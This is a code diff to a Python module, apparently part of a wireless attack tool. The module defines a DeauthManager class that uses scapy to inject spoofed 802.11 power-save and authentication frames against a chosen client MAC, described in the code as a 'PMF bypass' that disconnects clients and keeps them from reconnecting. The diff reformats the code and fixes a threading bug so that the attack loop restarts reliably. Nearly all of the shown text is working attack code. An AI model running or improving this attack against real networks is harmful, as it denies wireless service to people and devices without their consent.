@@ -16,6 +16,7 @@ Usage:
   deauth.stop_pmf_bypass(target_mac="11:22:33:44:55:66")
   deauth.stop_all()
 """
+
 from __future__ import annotations
 
 import shutil
@@ -35,18 +36,18 @@ except ImportError:
 
 
 class DeauthManager:
-    DEAUTH_INTERVAL = 0.2    # seconds between deauth bursts (faster = harder to reconnect)
-    BURST_COUNT     = 5      # frames per burst
+    DEAUTH_INTERVAL = 0.2  # seconds between deauth bursts (faster = harder to reconnect)
+    BURST_COUNT = 5  # frames per burst
 
     def __init__(self, bssid: str, iface: str):
         """
         bssid: Access Point MAC address
         iface: Monitor-mode interface (e.g. wlan0mon, wlan0)
         """
-        self._bssid  = bssid
-        self._iface  = iface
-        self._lock   = threading.Lock()
-        self._stops: dict[str, threading.Event] = {}   # mac → stop event
+        self._bssid = bssid
+        self._iface = iface
+        self._lock = threading.Lock()
+        self._stops: dict[str, threading.Event] = {}  # mac → stop event
         self._targets: set[str] = set()
         self._running = False
         self._active = SCAPY_WIFI_OK and bool(bssid) and bool(iface)
@@ -61,8 +62,7 @@ class DeauthManager:
         if not iw:
             return iface
         try:
-            subprocess.run([iw, "dev", iface, "set", "monitor", "none"],
-                           capture_output=True)
+            subprocess.run([iw, "dev", iface, "set", "monitor", "none"], capture_output=True)
         except Exception:
             pass
         return iface
@@ -74,11 +74,16 @@ class DeauthManager:
         2. AP thinks client is sleeping and starts buffering their traffic.
         3. Send a spoofed Auth frame (Open) to reset association.
         """
-        if not self._iface or not self._bssid: return
-        with self._lock: self._targets.add(target_mac)
-        
-        if not self._running:
-            self._running = True
+        if not self._active:
+            return  # scapy Dot11 unavailable (or no bssid/iface) — don't start a worker that crashes
+        if not self._iface or not self._bssid:
+            return
+        with self._lock:
+            self._targets.add(target_mac)
+            start = not self._running
+            if start:
+                self._running = True
+        if start:
             threading.Thread(target=self._pmf_loop, daemon=True, name="pmf_bypass").start()
 
     def stop_pmf_bypass(self, target_mac: str):
@@ -87,27 +92,38 @@ class DeauthManager:
             self._targets.discard(target_mac)
 
     def _pmf_loop(self):
-        while self._running:
-            with self._lock: targets = list(self._targets)
-            if not targets: break
-            
+        while True:
+            with self._lock:
+                if not self._running:
+                    return
+                targets = list(self._targets)
+                if not targets:
+                    # No targets left: mark stopped so a later start_pmf_bypass
+                    # spawns a fresh worker. The old loop broke here leaving
+                    # _running True, so deauth silently never restarted.
+                    self._running = False
+                    return
+
             for target in targets:
                 # Part 1: Power Save Trigger (FCfield 0x14 = PM bit set)
                 # Tells AP: "I am client and I'm going to sleep, buffer my data"
-                pkt_ps = (
-                    RadioTap() /
-                    Dot11(addr1=self._bssid, addr2=target, addr3=self._bssid, 
-                          type=2, subtype=4, FCfield=0x14)
+                pkt_ps = RadioTap() / Dot11(
+                    addr1=self._bssid,
+                    addr2=target,
+                    addr3=self._bssid,
+                    type=2,
+                    subtype=4,
+                    FCfield=0x14,
                 )
-                
+
                 # Part 2: State Reset (Auth frame)
                 # Causes AP to drop the session state for the client
                 pkt_auth = (
-                    RadioTap() /
-                    Dot11(addr1=self._bssid, addr2=target, addr3=self._bssid) /
-                    Dot11Auth(algo=0, seqnum=1, status=0)
+                    RadioTap()
+                    / Dot11(addr1=self._bssid, addr2=target, addr3=self._bssid)
+                    / Dot11Auth(algo=0, seqnum=1, status=0)
                 )
-                
+
                 try:
                     sendp(pkt_ps, iface=self._iface, verbose=False, count=5)
                     sendp(pkt_auth, iface=self._iface, verbose=False, count=5)
@@ -123,6 +139,7 @@ class DeauthManager:
 
     def stop_all(self):
         with self._lock:
+            self._running = False  # stop the worker loop promptly
             stops = list(self._stops.values())
             self._stops.clear()
             self._targets.clear()
